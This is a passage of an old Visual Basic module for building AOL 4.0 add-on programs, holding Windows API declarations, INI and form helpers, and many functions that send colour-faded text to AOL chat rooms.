Attribute VB_Name = "Ravage2"
''  ¤—————————————=–=———————————————¤
'  |     RàVàGè`s ³² ßìt ßàs!      |
'  |      For Vì§ùà£ ßàŠì¢ 4 & 5   |
'  |           For AoL 4.o         |
'  ¤—————————————=–=———————————————¤
'
'     Sup all this is my Second bas
'  file it has 415 subs and functions
'    in it , Just about anything u
'   will ever need to make a great
'    prog. There are examples and
'   help in the bas on alot of the
' subs so it is easy for u to succed
'      in makin an awsome prog
'  some of the shit in my bas was
'  takin outta other  bas files and
'   they were givin credit for it
'  If u wanna use shit from my bas
'  to make your own make sure u do
'   the same for me ... If u need
'   any help with this bas or have
'   any ideas of stuff that can be
'         added e-mail me at
'
'         RaVaGeVbX@aol.com
'
'     Updated Currently By: Soap
'         www.come.to/aqua!
'
'    ¤¤¤¤¤ ¤¤¤¤¤   ¤   ¤¤¤¤  ¤¤¤¤
'    ¤ ¤ ¤ ¤      ¤ ¤  ¤     ¤
'    ¤¤¤¤¤ ¤¤¤¤¤  ¤¤¤  ¤     ¤¤¤¤
'    ¤     ¤      ¤ ¤  ¤     ¤
'    ¤     ¤¤¤¤¤  ¤ ¤  ¤¤¤¤  ¤¤¤¤¤
'_____________________________
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Declare Function MciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As Any, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long
Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2
Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230
Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3
Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181
Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9
Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10
Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1
Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&
Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)
Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000
Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type
Type POINTAPI
   X As Long
   Y As Long
End Type
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function ReleaseCapture Lib "user32" () As Long
Public Const WM_NCLBUTTONDOWN = &HA1
Public Const HTCAPTION = 2
Global iniPath




Public Function GetFromINI(AppName$, KeyName$, Filename$) As String
Dim RetStr As String
RetStr = String(255, Chr(0))
GetFromINI = Left(RetStr, GetPrivateProfileString(AppName$, ByVal KeyName$, "", RetStr, Len(RetStr), Filename$))
'To write to an ini type this
'R% = WritePrivateProfileString("ascii", "Color", "bbb", App.Path + "\RaVaGe.ini")

'To read do this
'Color$ = GetFromINI("ascii", "Color", App.Path + "\RaVaGe.ini")
'If Color$ = "bbb" Then

'*Note* an .ini must be in the the same foder as the prog with these examples
'For more info read the ini_Help.txt that was included with this
End Function

Public Function Random(index As Integer)
Randomize
Result = Int((index * Rnd) + 1)
Random = Result
'To usethis,  example
'Dim NumSel As Integer
'NumSel = Random(2)
'If NumSel = 1 Then

'The number in ( ) is the max num.
'With that example you will either get a 1 or 2
End Function
Public Sub MoveForm(frm As Form)
ReleaseCapture
X = SendMessage(frm.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&)

'To use this,  put the following code in the "Mousedown"  dec
'of a label or picture box *Replace frm with your formname.
'MoveForm(frm)

End Sub

Sub BoldFadeBlack(TheText As String)
a = Len(TheText)
For w = 1 To a Step 18
    ab$ = Mid$(TheText, w, 1)
    u$ = Mid$(TheText, w + 1, 1)
    s$ = Mid$(TheText, w + 2, 1)
    T$ = Mid$(TheText, w + 3, 1)
    Y$ = Mid$(TheText, w + 4, 1)
    l$ = Mid$(TheText, w + 5, 1)
    f$ = Mid$(TheText, w + 6, 1)
    b$ = Mid$(TheText, w + 7, 1)
    c$ = Mid$(TheText, w + 8, 1)
    d$ = Mid$(TheText, w + 9, 1)
    H$ = Mid$(TheText, w + 10, 1)
    j$ = Mid$(TheText, w + 11, 1)
    k$ = Mid$(TheText, w + 12, 1)
    M$ = Mid$(TheText, w + 13, 1)
    n$ = Mid$(TheText, w + 14, 1)
    q$ = Mid$(TheText, w + 15, 1)
    V$ = Mid$(TheText, w + 16, 1)
    Z$ = Mid$(TheText, w + 17, 1)
    PC$ = PC$ & "<b><I><FONT COLOR=#000000>" & ab$ & "<FONT COLOR=#111111>" & u$ & "<FONT COLOR=#222222>" & s$ & "<FONT COLOR=#333333>" & T$ & "<FONT COLOR=#444444>" & Y$ & "<FONT COLOR=#555555>" & l$ & "<FONT COLOR=#666666>" & f$ & "<FONT COLOR=#777777>" & b$ & "<FONT COLOR=#888888>" & c$ & "<FONT COLOR=#999999>" & d$ & "<FONT COLOR=#888888>" & H$ & "<FONT COLOR=#777777>" & j$ & "<FONT COLOR=#666666>" & k$ & "<FONT COLOR=#555555>" & M$ & "<FONT COLOR=#444444>" & n$ & "<FONT COLOR=#333333>" & q$ & "<FONT COLOR=#222222>" & V$ & "<FONT COLOR=#111111>" & Z$
Next w
SendChat (PC$)
'Code for the room shit will be
'Call Fadeblack(Text1.text)


'to make any of the subs werk in ims
'You will need 2 text boxes and a button
'Do the change below and copy that to your send button
   ' a = Len(Text2.text)
    'For B = 1 To a
        'c = Left(Text2.text, B)
        'D = Right(c, 1)
        'e = 255 / a
        'F = e * B
        'G = RGB(F, 0, 0)
        'H = RGBtoHEX(G)
    ' Dim msg
    ' msg=msg & "<B><Font Color=#" & H & ">" & D
    'Next B
   ' Call IMKeyword(Text1.text, msg)
'u can do it for mail too but
'that is harder and I will leave that to u
'to figure out
End Sub
Sub BoldFadeGreen(TheText As String)
a = Len(TheText)
For w = 1 To a Step 18
    ab$ = Mid$(TheText, w, 1)
    u$ = Mid$(TheText, w + 1, 1)
    s$ = Mid$(TheText, w + 2, 1)
    T$ = Mid$(TheText, w + 3, 1)
    Y$ = Mid$(TheText, w + 4, 1)
    l$ = Mid$(TheText, w + 5, 1)
    f$ = Mid$(TheText, w + 6, 1)
    b$ = Mid$(TheText, w + 7, 1)
    c$ = Mid$(TheText, w + 8, 1)
    d$ = Mid$(TheText, w + 9, 1)
    H$ = Mid$(TheText, w + 10, 1)
    j$ = Mid$(TheText, w + 11, 1)
    k$ = Mid$(TheText, w + 12, 1)
    M$ = Mid$(TheText, w + 13, 1)
    n$ = Mid$(TheText, w + 14, 1)
    q$ = Mid$(TheText, w + 15, 1)
    V$ = Mid$(TheText, w + 16, 1)
    Z$ = Mid$(TheText, w + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#001100>" & ab$ & "<FONT COLOR=#002200>" & u$ & "<FONT COLOR=#003300>" & s$ & "<FONT COLOR=#004400>" & T$ & "<FONT COLOR=#005500>" & Y$ & "<FONT COLOR=#006600>" & l$ & "<FONT COLOR=#007700>" & f$ & "<FONT COLOR=#008800>" & b$ & "<FONT COLOR=#009900>" & c$ & "<FONT COLOR=#00FF00>" & d$ & "<FONT COLOR=#009900>" & H$ & "<FONT COLOR=#008800>" & j$ & "<FONT COLOR=#007700>" & k$ & "<FONT COLOR=#006600>" & M$ & "<FONT COLOR=#005500>" & n$ & "<FONT COLOR=#004400>" & q$ & "<FONT COLOR=#003300>" & V$ & "<FONT COLOR=#002200>" & Z$
Next w
SendChat (PC$)
End Sub
Function BoldFadeRed(TheText As String)
a = Len(TheText)
For w = 1 To a Step 18
    ab$ = Mid$(TheText, w, 1)
    u$ = Mid$(TheText, w + 1, 1)
    s$ = Mid$(TheText, w + 2, 1)
    T$ = Mid$(TheText, w + 3, 1)
    Y$ = Mid$(TheText, w + 4, 1)
    l$ = Mid$(TheText, w + 5, 1)
    f$ = Mid$(TheText, w + 6, 1)
    b$ = Mid$(TheText, w + 7, 1)
    c$ = Mid$(TheText, w + 8, 1)
    d$ = Mid$(TheText, w + 9, 1)
    H$ = Mid$(TheText, w + 10, 1)
    j$ = Mid$(TheText, w + 11, 1)
    k$ = Mid$(TheText, w + 12, 1)
    M$ = Mid$(TheText, w + 13, 1)
    n$ = Mid$(TheText, w + 14, 1)
    q$ = Mid$(TheText, w + 15, 1)
    V$ = Mid$(TheText, w + 16, 1)
    Z$ = Mid$(TheText, w + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FF0000>" & ab$ & "<FONT COLOR=#990000>" & u$ & "<FONT COLOR=#880000>" & s$ & "<FONT COLOR=#770000>" & T$ & "<FONT COLOR=#660000>" & Y$ & "<FONT COLOR=#550000>" & l$ & "<FONT COLOR=#440000>" & f$ & "<FONT COLOR=#330000>" & b$ & "<FONT COLOR=#220000>" & c$ & "<FONT COLOR=#110000>" & d$ & "<FONT COLOR=#220000>" & H$ & "<FONT COLOR=#330000>" & j$ & "<FONT COLOR=#440000>" & k$ & "<FONT COLOR=#550000>" & M$ & "<FONT COLOR=#660000>" & n$ & "<FONT COLOR=#770000>" & q$ & "<FONT COLOR=#880000>" & V$ & "<FONT COLOR=#990000>" & Z$
Next w
BoldFadeRed = (PC$)


End Function
Function BoldFadeBlue(TheText As String)
a = Len(TheText)
For w = 1 To a Step 18
    ab$ = Mid$(TheText, w, 1)
    u$ = Mid$(TheText, w + 1, 1)
    s$ = Mid$(TheText, w + 2, 1)
    T$ = Mid$(TheText, w + 3, 1)
    Y$ = Mid$(TheText, w + 4, 1)
    l$ = Mid$(TheText, w + 5, 1)
    f$ = Mid$(TheText, w + 6, 1)
    b$ = Mid$(TheText, w + 7, 1)
    c$ = Mid$(TheText, w + 8, 1)
    d$ = Mid$(TheText, w + 9, 1)
    H$ = Mid$(TheText, w + 10, 1)
    j$ = Mid$(TheText, w + 11, 1)
    k$ = Mid$(TheText, w + 12, 1)
    M$ = Mid$(TheText, w + 13, 1)
    n$ = Mid$(TheText, w + 14, 1)
    q$ = Mid$(TheText, w + 15, 1)
    V$ = Mid$(TheText, w + 16, 1)
    Z$ = Mid$(TheText, w + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000019>" & ab$ & "<FONT COLOR=#000026>" & u$ & "<FONT COLOR=#00003F>" & s$ & "<FONT COLOR=#000058>" & T$ & "<FONT COLOR=#000072>" & Y$ & "<FONT COLOR=#00008B>" & l$ & "<FONT COLOR=#0000A5>" & f$ & "<FONT COLOR=#0000BE>" & b$ & "<FONT COLOR=#0000D7>" & c$ & "<FONT COLOR=#0000F1>" & d$ & "<FONT COLOR=#0000D7>" & H$ & "<FONT COLOR=#0000BE>" & j$ & "<FONT COLOR=#0000A5>" & k$ & "<FONT COLOR=#00008B>" & M$ & "<FONT COLOR=#000072>" & n$ & "<FONT COLOR=#000058>" & q$ & "<FONT COLOR=#00003F>" & V$ & "<FONT COLOR=#000026>" & Z$
Next w
BoldFadeBlue = (PC$)

End Function

Sub BoldFadeYellow(TheText As String)
a = Len(TheText)
For w = 1 To a Step 18
    ab$ = Mid$(TheText, w, 1)
    u$ = Mid$(TheText, w + 1, 1)
    s$ = Mid$(TheText, w + 2, 1)
    T$ = Mid$(TheText, w + 3, 1)
    Y$ = Mid$(TheText, w + 4, 1)
    l$ = Mid$(TheText, w + 5, 1)
    f$ = Mid$(TheText, w + 6, 1)
    b$ = Mid$(TheText, w + 7, 1)
    c$ = Mid$(TheText, w + 8, 1)
    d$ = Mid$(TheText, w + 9, 1)
    H$ = Mid$(TheText, w + 10, 1)
    j$ = Mid$(TheText, w + 11, 1)
    k$ = Mid$(TheText, w + 12, 1)
    M$ = Mid$(TheText, w + 13, 1)
    n$ = Mid$(TheText, w + 14, 1)
    q$ = Mid$(TheText, w + 15, 1)
    V$ = Mid$(TheText, w + 16, 1)
    Z$ = Mid$(TheText, w + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FFFF00>" & ab$ & "<FONT COLOR=#999900>" & u$ & "<FONT COLOR=#888800>" & s$ & "<FONT COLOR=#777700>" & T$ & "<FONT COLOR=#666600>" & Y$ & "<FONT COLOR=#555500>" & l$ & "<FONT COLOR=#444400>" & f$ & "<FONT COLOR=#333300>" & b$ & "<FONT COLOR=#222200>" & c$ & "<FONT COLOR=#111100>" & d$ & "<FONT COLOR=#222200>" & H$ & "<FONT COLOR=#333300>" & j$ & "<FONT COLOR=#444400>" & k$ & "<FONT COLOR=#555500>" & M$ & "<FONT COLOR=#666600>" & n$ & "<FONT COLOR=#777700>" & q$ & "<FONT COLOR=#888800>" & V$ & "<FONT COLOR=#999900>" & Z$
Next w
SendChat (PC$)

End Sub


Function BoldBlackBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)

End Function

Function BoldBlackGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldBlackGrey(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function

Function BoldBlackPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldBlackRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldBlackYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldBlueBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldBlueGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldBluePurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldBlueRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldBlueYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldGreenBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldGreenBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldGreenPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldGreenRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldGreenYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
  SendChat (msg)
End Function

Function BoldGreyBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldGreyBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldGreyGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldGreyPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldGreyRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldGreyYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldPurpleBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldPurpleBlue(Text As String)
    a = Len(Text)
